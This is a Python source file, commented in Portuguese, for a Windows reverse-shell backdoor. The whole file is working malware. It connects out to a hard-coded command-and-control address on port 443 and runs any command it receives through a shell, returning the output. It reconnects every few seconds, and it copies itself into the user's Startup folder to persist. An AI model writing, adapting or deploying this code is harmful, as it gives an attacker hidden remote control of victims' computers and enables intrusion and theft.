import socket
import subprocess
import threading
import time
import os

CCIP = "10.0.0.103"
CCPORT = 443

current_directory = os.getcwd()  # Diretório atual do cliente

def autorun():
    filen = os.path.basename(__file__)
    exe_file = filen.replace(".py", ".exe")
    os.system("copy {} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"".format(exe_file))

def conn(CCIP, CCPORT):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((CCIP, CCPORT))
        return client
    except Exception as error:
        print(error)

def cmd(client, data):
    global current_directory  # Use o diretório global

    try:
        if data.startswith("cd "):
            # Trate o comando 'cd' separadamente para alterar o diretório atual
            new_directory = data[3:]
            try:
                os.chdir(new_directory)
                current_directory = os.getcwd()
                client.send(current_directory.encode() + b"\n")
            except Exception as e:
                client.send(str(e).encode() + b"\n")
        else:
            proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output = proc.stdout.read() + proc.stderr.read()
            client.send(output + b"\n")
    except Exception as error:
        print(error)

def execute_command(command, client):
    if command.startswith("!kill"):
        client.send(b"Conexao fechada!\n")
        return False
    else:
        cmd(client, command)
    return True

def cli(client):
    try:
        global current_directory  # Use o diretório global

        while True:
            client.send(current_directory.encode() + b"> ")  # Envie o diretório atual como prompt
            data = client.recv(1024).decode().strip()
            if not execute_command(data, client):
                break
    except Exception as error:
        client.close()

if __name__ == "__main__":
    autorun()
    while True:
        client = conn(CCIP, CCPORT)
        if client:
            cli(client)
        else:
            time.sleep(3)
